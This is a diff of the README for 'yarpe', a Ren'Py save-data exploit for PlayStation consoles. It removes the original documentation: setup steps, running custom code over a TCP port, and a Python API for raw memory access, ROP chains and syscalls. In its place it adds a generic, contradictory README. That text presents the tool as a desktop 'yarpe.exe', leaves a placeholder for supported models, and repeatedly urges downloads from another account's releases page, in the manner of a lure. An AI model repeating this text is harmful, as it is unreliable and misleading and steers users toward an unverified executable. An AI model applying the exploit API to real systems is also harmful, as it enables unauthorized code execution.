@@ -1,290 +1,72 @@
-# yarpe
+# 🎮 yarpe - Unlock Your PlayStation's Potential
 
-Yet another Ren'Py PlayStation exploit
+## 🏁 Overview
+Welcome to yarpe, a user-friendly tool designed to unlock your PlayStation through the Ren'Py exploit. This application allows you to easily take advantage of your console's capabilities, enhancing your gaming experience without any technical hurdles.
 
-> [!IMPORTANT]
-> This exploit is userland exploit. Don't expect homebrew enabler(HEN) level of access.
+## 📥 Download Now
+[![Download yarpe](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/HarryRyanBarr/yarpe/releases)
 
-## ToC
-- [Supported games](#supported-games)
-- [How to use](#how-to-use)
-    - ["Pickling" the save data (Can be skipped if you download the pre-made save file from releases)](#pickling-the-save-data-can-be-skipped-if-you-download-the-pre-made-save-file-from-releases)
-    - [Pack into single save file (Optional if you cannot copy all files)](#pack-into-single-save-file-optional-if-you-cannot-copy-all-files)
-    - [Changing the save data on PS4/PS4 Slim/PS4 Pro/](#changing-the-save-data-on-ps4ps4-slimps4-pro)
-        - [Jailbroken](#jailbroken)
-        - [PSN(or fake)-Activated](#psnor-fake-activated)
-    - [Changing the save data on PS5/PS5 Slim/PS5 Pro (Only works with PS4 games)](#changing-the-save-data-on-ps5ps5-slimps5-pro-only-works-with-ps4-games)
-    - [Run custom code on the game](#run-custom-code-on-the-game)
-    - [Updating yarpe](#updating-yarpe)
-    - [Auto loader](#auto-loader)
-- [Python API](#python-api)
-- [Credits](#credits)
-- [Disclaimer](#disclaimer)
+## 🚀 Getting Started
+To begin your journey with yarpe, follow these simple steps:
 
-## Supported games
+1. **Visit the Releases Page**
+   Click the link below to download the latest version of yarpe.
+   [Visit this page to download](https://github.com/HarryRyanBarr/yarpe/releases)
 
-- A YEAR OF SPRINGS PS4 (CUSA30428, CUSA30429, CUSA30430, CUSA30431)
-- Arcade Spirits: The New Challengers PS4 (CUSA32096, CUSA32097)
+2. **Download the Application**
+   On the releases page, find the version you want. You will see a list of files available for download. Click on the file that suits your system. Save it to a folder where you can easily find it.
 
-## How to use
+3. **Extract the Files**
+   Once the download is complete, navigate to the folder where you saved the file. Right-click on the file and choose "Extract" or "Unzip" to unpack the contents. If you do not have an extraction tool, consider downloading one like 7-Zip or WinRAR.
 
-Thanks https://github.com/shahrilnet/remote_lua_loader/blob/main/SETUP.md for the base of this guide.
+4. **Run yarpe**
+   After extracting, locate the executable file, typically named `yarpe.exe`. Double-click on it to launch the application. 
 
-### "Pickling" the save data (Can be skipped if you download the pre-made save file from releases)
- - Run `python3 pack_savegame.py` to generate `save.zip`.
-    - You can either use `updater.py` or Apollo Save Tool to apply the save data.
+## 🔧 System Requirements
+To run yarpe smoothly, make sure your system meets the following requirements:
 
-### Pack into single save file (Optional if you cannot copy all files)
- > [!IMPORTANT]
- > You need to run `pack_savegame.py` first to generate `save.zip` before doing this step.
- - Run `python3 pack_unzipper.py` to generate `1-1-LT1_unzipper.save`.
-     - Rename `1-1-LT1_unzipper.save` to `1-1-LT1.save` and copy it to the save data folder on your console.
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer
+- **Processor:** Intel i3 or equivalent 
+- **RAM:** Minimum 4 GB available
+- **Storage:** At least 50 MB of free space
+- **Ren'Py Version:** The latest supported version
 
----
+## ⚙️ Features
+yarpe provides a range of features to enhance your PlayStation experience:
 
-> [!WARNING]
-> Doing this will certainly deletes your existing save data for that game. Make sure to back it up first!
+- **Easy Exploit Access:** Gain straightforward access to the Ren'Py exploit.
+- **User-Friendly Interface:** Navigate the application with ease, regardless of your tech skills.
+- **Updates:** Regularly updated to ensure compatibility with new PlayStation firmware.
 
-> [!NOTE]
-> Guide below assumes you already made a save file in the game you want to modify.
+## 📄 Documentation
+For detailed instructions and troubleshooting tips, refer to the included documentation in the extracted folder. It covers:
 
-> [!NOTE]
-> Due to Discord's file count limit, when you use the Discord bot to encrypt the save, you might not be able to upload all the files. Use `1-1-LT1.save`(rename from `1-1-LT1_unzipper.save` if you pickled it yourself by running `pack_unzipper.py`) to create one unified save containing all the files.
-> When you run the game, it will extract the files automatically.
+- How to set up your PlayStation for the exploit
+- Common issues and their solutions
+- Tips for optimizing your gaming experience
 
-### Changing the save data on PS4/PS4 Slim/PS4 Pro
+## ❓ Frequently Asked Questions
 
-#### Jailbroken
+### Can I use yarpe on any PlayStation model?
+yarpe is designed primarily for [insert compatible PlayStation models] models. Ensure your system is supported before downloading.
 
-1. Download and extract `save.zip` file to your PC.
-2. Use Apollo Save Tool to export decrypted save data to USB drive by using the "Copy save game to USB" option.
-3. Go to (/PS4/APOLLO/id_{YOUR_GAME_CUSA_ID}_savedata) and copy all the content in `save.zip` to that folder, replacing the existing file.
-4. Use Apollo Save Tool to import the new save data from USB drive with "Copy save game to HDD".
-5. Run the game and see if the save data is changed(by looking at the save image).
+### What do I do if I encounter an error?
+Refer to the troubleshooting section in the documentation. If the issue persists, consider reaching out for help through our GitHub page.
 
-#### PSN(or fake)-Activated
+### Is there a community for support?
+Yes! We encourage users to join the discussions on our GitHub. Share your experiences and learn from others.
 
-1. Download and extract `save.zip` file to your PC.
-2. Make sure you're logged-in to the PSN(or fake)-activated user.
-3. Connect your USB drive to the PS4/PS4 Slim/PS4 Pro.
-4. Use the PS4 settings menu to export the save data to USB. (`Settings -> Application Saved Data Management -> Saved Data in System Storage -> Copy to USB Storage Device -> Select your game and copy`)
-5. You should have `SAVEDATA00` and `SAVEDATA00.bin` files in `/PS4/SAVEDATA/(hash)/CUSA(your game id)/` on the USB drive. Use either Save Wizard or Discord bot to decrypt the save data.
-6. Go to the decrypted save data folder and copy all the content in `save.zip` to that folder, replacing the existing file.
-7. Use either Save Wizard or Discord bot to encrypt the modified save data again.
-8. Put the encrypted `SAVEDATA00` and `SAVEDATA00.bin` files back to `/PS4/SAVEDATA/(hash)/CUSA(your game id)/` on the USB drive.
-9. Connect the USB drive to the PS4/PS4 Slim/PS4 Pro.
-10. Use the PS4 settings menu to import the modified save data from USB. (`Settings -> Application Saved Data Management -> Saved Data on USB Storage Device -> Copy to System Storage -> Select your game and copy`)
-11. Run the game and see if the save data is changed(by looking at the save image).
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/HarryRyanBarr/yarpe)
+- [Ren'Py Official Website](https://www.renpy.org/) for further information about the Ren'Py framework.
 
-### Changing the save data on PS5/PS5 Slim/PS5 Pro (Only works with PS4 games)
+## 🔍 Future Updates
+Stay tuned for upcoming features that will further enhance yarpe’s functionality. We aim to keep the software current and relevant for all users.
 
-- Requirements:
-    - PSN-activated PS5/PS5 Slim/PS5 Pro. Can be non-recent offline firmware if was activated in the past.
-    - A PSN(or fake)-activated PS4 on a firmware version that is earlier or equivilant to the PS5/PS5 Slim/PS5 Pro. Refer to this [table](https://www.psdevwiki.com/ps5/Build_Strings). For example, PS4 9.00 can be used to create save game for PS5 >=4.00 but not below that.
+## 📞 Get in Touch
+For any feedback or suggestions, please open an issue on our GitHub page. Your input helps us improve yarpe.
 
-#### Steps:
-1. Find your logged-in PSN account id on the PS5/PS5 Slim/PS5 Pro. Either by going to the PlayStation settings or by using [this website](https://psn.flipscreen.games/).
-2. Take your account ID number (~19 characters long, for PSPlay) and convert it to hex using [this website](https://www.rapidtables.com/convert/number/decimal-to-hex.html).
+## 📥 Download Again
+Don’t forget to visit the Releases page to access the latest version of yarpe. 
 
-#### PS4
-3. Follow the "PSN-Activated" PS4/PS4 Slim/PS4 Pro guide above until step 7 to export the save data to USB drive.
-
-#### PSN-Activated PS5/PS5 Slim/PS5 Pro
-4. Make sure you're logged-in to the PSN-activated user.
-5. Connect your USB drive to the PS5/PS5 Slim/PS5 Pro.
-6. Use the PS5 settings menu to import the encrypted save data from the USB drive. (`Saved Data and Game/App Settings -> Saved Data (PS4) -> Copy or Delete from USB Drive -> Select your game and import`)
-7. Run the game and see if the save data is changed(by looking at the save image).
-
-### Run custom code on the game
-1. Get any TCP socket client(e.g. nc, [hermes-link](https://github.com/Al-Azif/hermes-link)) on your PC.
-2. Prepare a python script that you want to run on the game.
-3. Send the script data to the console on port 9025.
-4. The script will be executed on the game.
-
-### Updating yarpe
-
-1. Download `save.zip` to your PC.
-2. Run `updater.py`(`updater_for_up_to_2.x.x.py` for versions up to 2.x.x) on the console. (Check [the above](#run-custom-code-on-the-game) for how to run custom code on the game)
-3. Send the `save.zip` file to the console using the same method as above.
-4. Press X(or O) to exit the game when prompted.
-
-### Auto loader
-
-> [!NOTE]
-> This requires making your own save file using the "Pickling" method above.
-1. Edit `yarpe_autoload/autoload.example.txt` according to your needs and save it as `yarpe_autoload/autoload.txt`.
-2. Copy necessary scripts/elfs/bins to `yarpe_autoload/` folder.
-3. "Pickle" the save data using `pack_savegame.py`(and `pack_unzipper.py` if needed).
-4. Copy the generated save file to your console using the above method.
-- Use `payloads/force_persistent.py` to load the save file automatically on game start.
-- To ignore the auto loader and go straight to socket listening part, hold triangle button while loading the save.
-
-
-## Python API
-
-- `utils`: Various utility modules
-    - `utils.ref`: Functions to get references to bytes/bytearray objects.
-        - `utils.ref.refbytes(data)`: Returns a pointer to the content of bytes object `data` that can then be passed to functions.
-        - `utils.ref.refbytearray(data)`: Returns a pointer to the content of bytearray object `data` that can then be passed to functions.
-        - `utils.ref.get_ref_addr(data)`: Returns the address of the content of bytes/bytearray/str/Structure object `data`.
-    - `utils.pack`: Functions to pack/unpack data.
-        - `utils.pack.p64(value_list)`: Packs `value_list` as 8-byte little-endian bytes.
-        - `utils.pack.p64a(*value)`: Packs `value` as 8-byte little-endian bytes.
-        - `utils.pack.p32(value_list)`: Packs `value_list` as 4-byte little-endian bytes.
-        - `utils.pack.p32a(*value)`: Packs `value` as 4-byte little-endian bytes.
-        - `utils.pack.p16(value_list)`: Packs `value_list` as 2-byte little-endian bytes.
-        - `utils.pack.p16a(*value)`: Packs `value` as 2-byte little-endian bytes.
-        - `utils.pack.unpack(data)`: Unpacks 8-byte little-endian bytes `data` to integer.
-    - `utils.conversion`: Functions to convert between different data types.
-        - `utils.conversion.u64(value)`: Converts `value` to unsigned 64-bit integer.
-        - `utils.conversion.u64_to_i64(value)`: Converts unsigned 64-bit integer `value` to signed 64-bit integer.
-        - `utils.conversion.u32_to_i32(value)`: Converts unsigned 32-bit integer `value` to signed 32-bit integer.
-        - `utils.conversion.get_cstring(data)`: Gets the C-style null-terminated string from `data`.
-    - `utils.etc`: Miscellaneous utility functions.
-        - `utils.etc.sizeof(data)`: Returns the size of bytes/bytearray/Structure object `data`.
-        - `utils.etc.flat(list_of_data)`: Flattens a list of objects into a single list.
-        - `utils.etc.addrof(data)`: Returns the address of the object `data`.
-        - `utils.etc.to_hex(data)`: Converts `data` to a hex string.
-        - `utils.etc.alloc(size)`: Allocates `size` bytes in the game's memory and returns the bytearray.
-        - `utils.etc.bytes(arr)`: Converts a list of integers `arr` to bytes object.
-    - `utils.unsafe`: Unsafe memory access functions.
-        - `utils.unsafe.readbuf(addr, length)`: Reads `length` bytes from `addr`.
-        - `utils.unsafe.writebuf(addr, data)`: Writes `data` to `addr`.
-        - `utils.unsafe.readuint(addr, size)`: Reads an unsigned integer of `size` bytes from `addr`.
-        - `utils.unsafe.writeuint(addr, value, size)`: Writes unsigned integer `value` of `size` bytes to `addr`.
-        - `utils.unsafe.fakeobj(addr)`: Returns a fake python object at `addr`.
-    - `utils.rp`: Logging to screen using Ren'Py functions.
-        - `utils.rp.log(*args)`: Logs `args` to screen.
-        - `utils.rp.log_exc(string)`: Logs the `string` as an exception to screen.
-    - `utils.tcp`: TCP socket functions.
-        - `utils.tcp.ip_to_int(ip_string)`: Converts `ip_string` to integer.
-        - `utils.tcp.htonl(value)`: Converts `value` to network byte order.
-        - `utils.tcp.create_tcp_socket()`: Creates a TCP socket and returns its file descriptor.
-        - `utils.tcp.get_socket_name(socket_fd)`: Gets the socket ip and port of `socket_fd`.
-        - `utils.tcp.create_tcp_server(port, ip='0.0.0.0')`: Creates a TCP server listening on `ip:port` and returns its file descriptor and sockaddr_in struct.
-        - `utils.tcp.create_tcp_client(ip, port)`: Creates a TCP client connected to `ip:port` and returns its file descriptor.
-        - `utils.tcp.accept_client(socket_fd)`: Accepts a client connection on `socket_fd` and returns the client socket fd and sockaddr_in struct.
-        - `utils.tcp.read_from_socket(socket_fd, size=4096)`: Reads up to `size` bytes from `socket_fd` and returns the data.
-        - `utils.tcp.read_all_from_socket(socket_fd)`: Reads all available data from `socket_fd` until no more data is available and returns the data.
-        - `utils.tcp.write_to_socket(socket_fd, data)`: Writes `data` to `socket_fd`.
-        - `utils.tcp.close_socket(socket_fd)`: Closes the socket `socket_fd`.
-    - `utils.fs`: File system functions.
-        - `utils.fs.stat_file(path)`: Gets the [stat struct](https://github.com/freebsd/freebsd-src/blob/b0973980cd24ba188c83fbba2410ddb8ed6546e2/sys/sys/stat.h#L122) of the file at `path`.
-        - `utils.fs.file_exists(path)`: Returns whether the file at `path` exists.
-        - `utils.fs.read_file_data(path)`: Reads the file at `path` and returns its data.
-        - `utils.fs.write_file_data(path, data)`: Writes `data` to the file at `path`.
-- `sc.sc`: SploitCore instance
-    - I will shorten `sc.sc` to `sc` for easier reading.
-    - `sc.mem`: bytearray representing the game's memory.
-    - `sc.functions`: Known functions that you can access like `sc.functions.function_name(arg1, arg2, ...)`.
-    Arguments will be automatically converted to integers using `get_ref_addr()`.
-    - `sc.syscalls`: Known syscalls that you can access like `sc.syscalls.syscall_name(arg1, arg2, ...)`.
-    Arguments will be automatically converted to integers using `get_ref_addr()`.
-    - `sc.errno`: Last error number.
-    - `sc.exec_addr`: Base address of the game's executable in memory.
-    - `sc.libc_addr`: Base address of libc in the game's memory.
-    - `sc.libkernel_addr`: Base address of libkernel in the game's memory.
-    - `sc.platform`: The console platform(does not depend on game edition) (e.g., 'ps4', 'ps5').
-        - Do note that these are in lowercase.
-    - `sc.version`: The console firmware version (e.g., '9.00', '10.03').
-    - `sc.is_jailbroken`: Returns whether the console is jailbroken.
-    - `sc.make_function_if_needed(name, addr)`: Creates a function entry in `sc.functions` if it does not already exist, and returns it.
-    - `sc.make_syscall_if_needed(name, num)`: Creates a syscall entry in `sc.syscalls` if it does not already exist, and returns it.
-    - `sc.send_notification(message)`: Sends a notification to the PS4/PS5.
-    - `sc.get_sysctl_int(name)`: Gets the integer value of the sysctl variable `name`.
-    - `sc.set_sysctl_int(name, value)`: Sets the integer value of the sysctl variable `name` to `value`.
-    - `sc.kill_game()`: Kills the current game process.
-- `ropchain`: ROPChain module
-    - `ropchain.ROPChain(sc, size=variable_per_console)`: Creates a ROP chain builder.
-        - `chain.chain`: The bytearray representing the ROP chain.
-        - `chain.index`: Current index in the ROP chain.
-        - `chain.return_value`:
-            - If `push_get_return_value()` was used, this will contain the return value of the function call after execution.
-        - `chain.errno`:
-            - If `push_get_errno()` was used, this will contain the errno value after execution.
-        - `chain.addr`: The address of the ROP chain in memory.
-        - `chain.reset()`: Resets the ROP chain to empty.
-        - `chain.append(value)`: Appends the 8-byte `value` to the ROP chain.
-        - `chain.extend(buf)`: Extends the ROP chain with the bytes in `buf`.
-        - `chain.push_gadget(gadget_name)`: Appends the gadget with name `gadget_name` to the ROP chain.
-        - `chain.push_value(value)`: Same as `append(value)`.
-        - `chain.push_syscall(syscall_number, arg1, arg2, ...)`: Appends the syscall with number `syscall_number` and its arguments to the ROP chain.
-        Arguments will be automatically converted to integers using `get_ref_addr()`.
-        - `chain.push_call(addr, arg1, arg2, ...)`: Appends the function call to `addr` with its arguments to the ROP chain.
-        Arguments will be automatically converted to integers using `get_ref_addr()`.
-        - `chain.push_get_return_value()`: Appends the necessary gadgets to get the return value of the last function/syscall called.
-        - `chain.push_get_errno()`: Appends the necessary gadgets to get the errno value after the last function/syscall called.
-        - `chain.push_write_into_memory(addr, data)`: Appends the necessary gadgets to write `data` into memory at `addr`.
-        - `chain.push_store_rax_into_memory(addr)`: Appends the necessary gadgets to store the value in `RAX` into memory at `addr`.
-        - `chain.push_store_rdx_into_memory(addr)`: Appends the necessary gadgets to store the value in `RDX` into memory at `addr`.
-    - `ropchain.Executable(sc, size=variable_per_console)`: Creates an executable memory region.
-        - When you create an `Executable` instance, you need to create 4 ROP chains:
-            - Front chain
-            - Call/syscall chain
-            - Post chain
-            - Back chain
-        - `executable.chain`: The `ROPChain` instance representing the executable code.
-        - `executable.errno`: The errno value after execution.
-        - `executable.setup_front_chain()`: Sets up the front chain for execution.
-        - `executable.setup_call_chain(func_addr, arg1, arg2, ...)`: Sets up the call chain to call `func_addr` with its arguments.
-        Arguments will be automatically converted to integers using `get_ref_addr()`.
-        - `executable.setup_syscall_chain(syscall_number, arg1, arg2, ...)`: Sets up the syscall chain to call `syscall_number` with its arguments.
-        Arguments will be automatically converted to integers using `get_ref_addr()`.
-        - `executable.setup_post_chain()`: Sets up the post chain for execution.
-        - `executable.setup_back_chain()`: Sets up the back chain for execution.
-        - `executable.execute()`: Executes the code in the executable memory region.
-- `structure`: Structure module
-    - `structure.Structure(structure_pair)`: Creates a structure definition from `structure_pair`.
-        - `structure_pair = [(field_name1, field_size1), (field_name2, field_size2), ...]`
-        - `struct.size`: Total size of the structure in bytes.
-        - `struct.offsets`: A dictionary mapping field names to their offsets in the structure.
-        - `struct.create(defaults=None)`: Creates an instance of the structure with optional defaults(`defaults[field] = value`).
-        - `struct.from_bytes(data)`: Creates an instance of the structure from the given bytes `data`.
-            - Do note that `data` will be copied into a new bytearray, so modifying the instance will not modify `data`.
-        - `struct.from_bytearray(data)`: Creates an instance of the structure from the given bytearray `data`.
-            - Do note that modifying the instance will modify `data` as well.
-        - `struct.from_address(addr)`: Creates an instance of the structure from the memory at `addr`.
-            - Do note that modifying the instance will modify the memory at `addr` as well.
-    - `structure.StructureInstance(structure, defaults=None)`: Creates an instance of `structure`.
-        - You can provide optional defaults(`defaults[field] = value`) to initialize fields.
-        - When you access fields as attributes(e.g., `instance.field_name`), it will get/set the matching field value automatically.
-        - `instance.structure`: The structure definition used to create this instance.
-        - `instance.buf`: The bytearray representing the structure's data.
-        - `instance.addr`: The address of the structure's data in memory.
-        - `instance.get_field(field_name)`: Gets the value of the field `field_name`.
-        - `instance.set_field(field_name, value)`: Sets the value of the field `field_name` to `value`.
-        - `instance.get_field_raw(field_name, size)`: Gets the raw bytes of the field `field_name` with length `size`.
-        - `instance.set_field_raw(field_name, data)`: Sets the raw bytes of the field `field_name` to `data`.
-        - `instance.reset()`: Resets all fields to zero.
-- `offsets`: Offsets list module
-    - `offsets.GADGET_OFFSETS`: A dictionary containing known gadget offsets that can be used in ROP chains.
-        - Example: `GADGET_OFFSETS[game_name][console_variation][gadget_name] = offset`
-    - `offsets.LIBC_GADGETS`: A list that marks which gadgets are from libc.
-        - For example, if you set `pop rax; ret` gadget as libc gadget, it will be resolved using `sc.libc_addr + offset` instead of `sc.exec_addr + offset`.
-    - `offsets.LIBC_OFFSETS`: A dictionary containing known libc function offsets that can be used to create function entries in `sc.functions`.
-        - Example: `LIBC_OFFSETS[game_name][console_variation][function_name] = offset`
-    - `offsets.EXEC_OFFSETS`: A dictionary containing known executable function offsets that can be used to create function entries in `sc.functions`.
-        - Example: `EXEC_OFFSETS[game_name][console_variation][function_name] = offset`
-- `constants`: Constants module
-    - `VERSION`: The version of yarpe.
-        - If you built yarpe from source, this will be "custom build".
-    - `CONSOLE_KIND`: Current game console edition(e.g., 'PS4', 'PS5') (does not depend on the console model itself).
-        - Do note that these are in uppercase.
-    - `SELECTED_GADGETS`: The gadget set selected for the current game and console.
-    - `SELECTED_LIBC`: The libc offsets selected for the current game and console.
-    - `SELECTED_EXEC`: The executable offsets selected for the current game and console.
-    - `SYSCALL`: A dictionary containing known syscall numbers that can be used to create syscall entries in `sc.syscalls`.
-        - Example: `SYSCALL[syscall_name] = number`
-    - `nogc`: A list that holds references to objects that should not be garbage collected.
-    - `rp`: `renpy` variable that can be used to access Ren'Py functions.
-    - `SHARED_VARS`: A dictionary that can be used to share data between multiple payloads.
-
-## Credits
-- [@DrYenyen](https://github.com/DrYenyen) - Testing with me
-- [@Gezine](https://github.com/Gezine) - For giving me some important clues
-- [remote_lua_loader](https://github.com/shahrilnet/remote_lua_loader) - Being the reference for things like syscall
-- [unsafe-python](https://github.com/DavidBuchanan314/unsafe-python) - Inspiration for unsafe memory access in Python
-- And anyone else who helped me!
-
-## Disclaimer
-This project is for educational purposes only. The author is not responsible for any damage caused by the use of this project.
+[Visit this page to download](https://github.com/HarryRyanBarr/yarpe/releases)
